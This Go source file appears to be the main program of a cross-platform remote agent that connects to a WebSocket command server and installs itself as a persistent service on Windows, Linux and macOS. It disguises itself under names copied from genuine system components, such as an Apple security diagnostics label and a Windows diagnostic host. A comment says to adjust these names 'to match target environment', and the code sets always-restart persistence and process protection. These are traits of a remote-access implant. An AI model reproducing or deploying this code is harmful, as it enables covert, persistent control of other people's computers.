package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"

	"argus/internal/agent"
)

// ── Service identity ──────────────────────────────────────────────────────────
// Adjust to match target environment. These strings appear in Task Manager,
// systemd unit listings, and launchctl output.
const (
	// Windows SCM
	svcName    = "WdiSystemHost32"
	svcDisplay = "Diagnostic System Host"
	svcDesc    = "Hosts Windows diagnostic services. If this service is stopped, diagnostics will be unavailable."

	// Linux systemd
	linuxUnit = "systemd-hostnamed-ext"
	linuxDesc = "Provides host name and related network metadata resolution."

	// macOS LaunchDaemon
	macLabel = "com.apple.security.diagnosticd"
)

// ─────────────────────────────────────────────────────────────────────────────

func main() {
	server    := flag.String("server", "", "WebSocket server URL (e.g. wss://example.com)")
	token     := flag.String("token", "", "Agent authentication token")
	id        := flag.String("id", "", "Agent ID (defaults to hostname)")
	doInstall := flag.Bool("install", false, "Install as a system service")
	doUninstall := flag.Bool("uninstall", false, "Uninstall the system service")
	flag.Parse()

	if *doUninstall {
		if err := uninstallService(); err != nil {
			log.Fatalf("uninstall failed: %v", err)
		}
		fmt.Println("Service uninstalled.")
		return
	}

	if *doInstall {
		if *server == "" || *token == "" {
			log.Fatal("--server and --token are required for --install")
		}
		if err := installService(*server, *token, *id); err != nil {
			log.Fatalf("install failed: %v", err)
		}
		fmt.Println("Service installed and started.")
		return
	}

	if *server == "" || *token == "" {
		log.Fatal("--server and --token are required")
	}

	agentID := *id
	if agentID == "" {
		h, _ := os.Hostname()
		agentID = h
	}

	// When invoked by SCM on Windows, hand off to the service dispatcher.
	if runAsServiceIfNeeded(*server, *token, agentID) {
		return
	}

	// Running interactively or via systemd/launchd — apply protections then run.
	if err := protectProcess(); err != nil {
		log.Printf("[!] protectProcess: %v", err)
	}

	a := agent.New(*server, *token, agentID)
	log.Fatal(a.Run())
}

func selfPath() (string, error) {
	return filepath.Abs(os.Args[0])
}

func installService(server, token, id string) error {
	exe, err := selfPath()
	if err != nil {
		return err
	}

	switch runtime.GOOS {
	case "windows":
		return installWindows(exe, server, token, id)
	case "linux":
		return installLinux(exe, server, token, id)
	case "darwin":
		return installDarwin(exe, server, token, id)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

func uninstallService() error {
	switch runtime.GOOS {
	case "windows":
		return uninstallWindows()
	case "linux":
		exec.Command("systemctl", "stop", linuxUnit).Run()
		exec.Command("systemctl", "disable", linuxUnit).Run()
		os.Remove("/etc/systemd/system/" + linuxUnit + ".service")
		return exec.Command("systemctl", "daemon-reload").Run()
	case "darwin":
		plist := "/Library/LaunchDaemons/" + macLabel + ".plist"
		exec.Command("launchctl", "unload", plist).Run()
		return os.Remove(plist)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

func installLinux(exe, server, token, id string) error {
	unit := fmt.Sprintf(`[Unit]
Description=%s
After=network.target

[Service]
ExecStart=%s --server %q --token %q --id %q
Restart=always
RestartSec=5
StartLimitIntervalSec=0

[Install]
WantedBy=multi-user.target
`, linuxDesc, exe, server, token, id)

	path := "/etc/systemd/system/" + linuxUnit + ".service"
	if err := os.WriteFile(path, []byte(unit), 0644); err != nil {
		return err
	}
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", linuxUnit).Run()
	return exec.Command("systemctl", "start", linuxUnit).Run()
}

func installDarwin(exe, server, token, id string) error {
	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>%s</string>
  <key>ProgramArguments</key>
  <array>
    <string>%s</string>
    <string>--server</string><string>%s</string>
    <string>--token</string><string>%s</string>
    <string>--id</string><string>%s</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>StandardOutPath</key><string>/var/log/%s.log</string>
  <key>StandardErrorPath</key><string>/var/log/%s.log</string>
</dict>
</plist>
`, macLabel, exe, server, token, id, macLabel, macLabel)

	path := "/Library/LaunchDaemons/" + macLabel + ".plist"
	if err := os.WriteFile(path, []byte(plist), 0644); err != nil {
		return err
	}
	return exec.Command("launchctl", "load", "-w", path).Run()
}
